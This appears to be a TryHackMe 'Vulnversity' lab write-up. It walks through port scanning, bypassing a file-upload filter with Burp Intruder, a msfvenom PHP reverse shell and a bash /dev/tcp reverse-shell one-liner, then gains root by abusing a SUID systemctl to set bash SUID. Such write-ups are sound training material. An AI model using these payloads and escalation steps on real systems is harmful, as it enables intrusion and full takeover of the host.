## Vulnversity

<h3>Link VM: <a href="https://tryhackme.com/room/Vulnversity" target="_blank">Vulnversity</a></h3>

<h3>Difficulty: <img src="https://img.shields.io/badge/easy-green?style=flat-square"> </h3>

### *Read the document in Spanish* <a href="Vulnversity.md">Vulnversity</a>

## Description of the attack

We start with a port scan using the Nmap tool:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.10.154.173
```
<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

We see that port 333 (http) is open, so we access the page by typing in the browser:

```
http://10.10.175.169:3333/
```

<p align="center"> 
<img src="images/Vuln.png" width="600" alt="Resultado de Nmap">
</p>

We will use web fuzzing to find subdomains, using the following command

```
 gobuster dir -u http://192.168.0.103:3333/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
<p align="center"> 
<img src="images/internal.png" width="600" alt="Resultado de Nmap">
</p>

The internal subdomain is very interesting to me, in the browser we write the following:

```
http://192.168.0.103:3333/internal/
```
<p align="center"> 
<img src="images/fileupload.png" width="600" alt="Resultado de Nmap">
</p>

In this case, we can carry out the **file upload** exploitation by creating a malicious file with **msfvenom**

```
msfvenom -p php/reverse_php LHOST=<IP Atacante> LPORT=443 -o shell.php
```

Next we are going to have problems, because it turns out that in this case the upload does not allow the upload of files with the .php extension, to know which is the correct one we will use **burp suite**

### Burp suite

We need to intercept the internal page in Burp Suite. To do this, select **Proxy-Intercept-intercept on**. Once activated, upload again, then right-click and click **send to repeater**.

<p align="center"> 
<img src="images/intruder.png" width="600" alt="Resultado de Nmap">
</p>

We go to the **intruder** tab, select all the information on the page and click **clear**

<p align="center"> 
<img src="images/clear.png" width="600" alt="Resultado de Nmap">
</p>

Next, we select only what we want to change. In this case, it would be the extension of the **shell.php** file, and click **Add**.

<p align="center"> 
<img src="images/php.png" width="600" alt="Resultado de Nmap">
</p>

It would look like this:

<p align="center"> 
<img src="images/extension.png" width="600" alt="Resultado de Nmap">
</p>

**Nota informativa**. Aunque en la imagen aparezca con el nombre **pwnedl.php** lo importante es la extensión del archivo, no el nombre.

**Information note**. Although the image shows the filename **pwnedl.php**, the important thing is the file extension, not the name.

Next, in the screen on the right, we go to **setting - Grep - Extract**

<p align="center"> 
<img src="images/grep_extract.png" width="600" alt="Resultado de Nmap">
</p>

Click **Add**, then **Fetch response**. Then, find the area where the text should be changed, which in this case would be **Extension not allowed**, and click OK.

<p align="center"> 
<img src="images/extension_not_allowed.png" width="600" alt="Resultado de Nmap">
</p>

It would look like this:

<p align="center"> 
<img src="images/resultado.png" width="600" alt="Resultado de Nmap">
</p>

When the **Extension not allowed** message changes to **Success**, we get a reward.

Next, we prepare the payload with a dictionary, then press **Start attack**

<p align="center"> 
<img src="images/start_attack.png" width="600" alt="Resultado de Nmap">
</p>

Result:

<p align="center"> 
<img src="images/success.png" width="600" alt="Resultado de Nmap">
</p>

Therefore we changed the extension of the malicious file **shell.php** to **shell.phtml**

```
mv shell.php shell.phtml
```

Now it will let us upload the malicious file.

Our next goal is to find where the uploaded file is located. To do this, we'll use web fuzzing.

```
gobuster dir -u http://10.10.175.169:3333/internal -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<p align="center"> 
<img src="images/uploads.png" width="600" alt="Resultado de Nmap">
</p>

We leave this command activated, which means that we are listening on port 443.

```
sudo nc -lvnp 443
```

We click on the newly uploaded file

<p align="center"> 
<img src="images/shell.png" width="600" alt="Resultado de Nmap">
</p>

Then we go to the command where we activate the listening port, and the following will appear:

<p align="center"> 
<img src="images/connect.png" width="600" alt="Resultado de Nmap">
</p>

To have a more stable connection, we open a terminal and type the following:

```
sudo nc -lvnp 444
```

Then, in the other terminal that we connected before, we write the following:

```
bash -c "sh -i >& /dev/tcp/10.8.139.36/444 0>&1"
```

<p align="center"> 
<img src="images/444.png" width="600" alt="Resultado de Nmap">
</p>

The previous command can be found at the following link: <a href="https://www.revshells.com" target="_blank">Reverse Shell</a>

### Escalation of privilege

Next we execute the following command:

```
find / -perm -4000 2>/dev/null
```

<p align="center"> 
<img src="images/systemctl.png" width="600" alt="Resultado de Nmap">
</p>

It is normal that at first we do not know which files to use, therefore, we help ourselves with this page <a href="https://gtfobins.github.io" target="_blank">gtfobins</a>

In the search engine we write **systemctl**, then we go to the **SUID** section, since the previous command is part of **SUID**

<p align="center"> 
<img src="images/SUID.png" width="600" alt="Resultado de Nmap">
</p>

Explanation of the code:

<p align="center"> 
<img src="images/código.png" width="600" alt="Resultado de Nmap">
</p>

In arrow 1, the command in quotes is the command that would be executed. **This is important to keep in mind**

Then, in arrows 2, **It is recommended to replace it with the absolute path**

To perform privilege escalation, we must perform **TTY processing**

### TTY

The command to be performed next is:

```
script /dev/null -c bash
```
Then, **control z**

Next, we enter a series of commands:

```
stty raw -echo; fg
reset xterm
```

Then in the new terminal, we export the new variables:

```
export TERM=xterm
export SHELL=bash
```

<p align="center"> 
<img src="images/nueva_terminal.png" width="600" alt="Resultado de Nmap">
</p>

Now commands like **control c** and **clear** will work without any problem!!

### Returning to the escalation of privilege

We go to the tmp folder

```
cd /tmp
```

We create a file called escalation.txt inside we write the following:

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

The relevant changes have been **id > /tmp/output** by **chmod u+s /bin/bash**

The command **chmod u+s /bin/bash** --> is very important, because I can change the bash permission to root

**Don't forget to change the relative path to an absolute path**

Once saved, run the following command:

```
bash escalada.sh (nombre del script)
bash -p
whoami
```

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

We go to the root folder, there we will find the red flag that we are missing:

```
cd /root
```
<p align="center"> 
<img src="images/red_flag.png" width="600" alt="Resultado de Nmap">
</p>

**Finished machine**